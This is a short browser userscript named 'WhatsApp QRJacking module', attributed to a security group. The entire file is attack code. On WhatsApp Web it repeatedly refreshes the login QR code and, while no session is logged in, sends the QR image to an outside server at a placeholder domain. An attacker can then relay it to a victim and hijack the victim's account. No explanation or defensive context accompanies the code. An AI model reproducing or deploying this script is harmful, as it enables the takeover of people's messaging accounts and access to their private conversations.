// ==UserScript==
// @name        WhatsApp QRJacking module
// @namespace   Seekuritylabs (@Seekurity)
// ==/UserScript==
var myTimer;
myTimer = window.setInterval(loopForQR, 3000);
function loopForQR() {
  if (document.readyState == 'complete') {
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      //Always wake-up the qrcode, Never sleep :D
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      //If WhatsApp is not logged in, Do;
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        //Mirror the QR Code to our server
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.domain.com/qrHanlder.php?c=' + document.getElementsByTagName('img')[0].src, true);
        xhttp.send();
      }
    }
  }
}
